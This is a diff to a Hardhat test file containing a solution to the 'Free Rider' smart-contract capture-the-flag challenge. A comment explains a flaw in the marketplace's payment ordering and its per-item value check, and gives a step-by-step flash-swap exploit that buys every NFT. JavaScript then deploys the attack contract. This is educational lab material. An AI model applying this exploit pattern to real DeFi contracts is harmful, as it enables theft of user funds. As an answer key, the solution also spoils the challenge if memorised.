@@ -103,8 +103,89 @@ describe('[Challenge] Free Rider', function () {
         );
     });
 
+     /**
+         * @dev
+         * Exploit overview:
+         * The bug in the Marketplace is the following lines:
+         * 
+         *  token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
+         *  payable(token.ownerOf(tokenId)).sendValue(priceToPay);
+         * 
+         * The intent from the developer was to pay the original owner of the NFT
+         * However they do this AFTER the ownership has transferred.
+         * 
+         * So the value of token.ownerOf(tokenId) returns the address of the purchaser (or msg.sender)
+         * 
+         * The second bug is require(msg.value >= priceToPay, "Amount paid is not enough");
+         * Since you can purchase multiple NFTs in the same transaction each call to _buyOne 
+         * is checking that msg.value can buy at least 1 multiple times. So you can provide 
+         * enough ETH to purchase 1 and then purchase them all.
+         * 
+         * So to exploit this we need to get our hands on at least 15 ETH so we can purchase
+         * at least one. 
+         * To do this we use a FlashSwap from the uniswapv2 protocol from the DVT <-> WETH pool
+         * 
+         * Great video on this is here https://www.youtube.com/watch?v=MxTgk-kvtRM
+         * 
+         * In a nutshell we need to borrow 15 weth and return it within a singular transaction
+         * 
+         * So the exploit path goes:
+         * 1. attacker deploys malicious contract
+         * 2. flashSwap(): attacker executes flashSwap function requesting 15 WETH
+         * 3. uniswapV2Call(): Uniswap Calls back with 15 WETH available
+         * 4. uniswapV2Call(): Call WETH contract to withdraw to ETH
+         * 5. uniswapV2Call(): Call marketplace buyMany([0, 1, 2, 3, 4, 5]) to buy all NFTs
+         *                      with a value of 1 NFT (15 ether)
+         * 6. uniswapV2Call(): Ensure attacking Contract implements IERC721Receiver and just 
+         *                      returns the receive functions selector.
+         * 7. uniswapV2Call(): Transfer each NFT 1 at a time to buyerContract
+         * 8. uniswapV2Call(): Deposit enough WETH to cover loan + fee (0.3%)
+         * 9. uniswapV2Call(): Transfer WETH back to loaner contract
+         * 
+         * The attack contract is available at:
+         * "contracts/attacker-contracts/AttackFreeRider.sol"
+
+         */
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const attackWeth = this.weth.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const attackFactory = this.uniswapFactory.connect(attacker);
+        const attackMarketplace = this.marketplace.connect(attacker);
+        const attackBuyer = this.buyerContract.connect(attacker);
+        const attackNft = this.nft.connect(attacker);
+
+        // Helper function to log balances
+        const logBalances = async (address, name) => {
+            const ethBal = await ethers.provider.getBalance(address);
+            const wethBal = await attackWeth.balanceOf(address);
+            
+            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
+            console.log(`WETH Balance of ${name}:`, ethers.utils.formatEther(wethBal));
+            console.log("")
+        }
+
+        console.log("Initial balances");
+        await logBalances(attacker.address, "attacker");
+
+
+        const AttackFactory = await ethers.getContractFactory("AttackFreeRider", attacker);
+        const attackContract = await AttackFactory.deploy(
+            attackWeth.address, 
+            attackFactory.address,
+            attackToken.address,
+            attackMarketplace.address,
+            attackBuyer.address,
+            attackNft.address,
+            );
+
+        await attackContract.flashSwap(attackWeth.address, NFT_PRICE, {
+            gasLimit: 1e6
+        });
+
+        console.log("*** FLASH SWAP EXECUTED ***");
+        await logBalances(attacker.address, "attacker");
     });
 
     after(async function () {
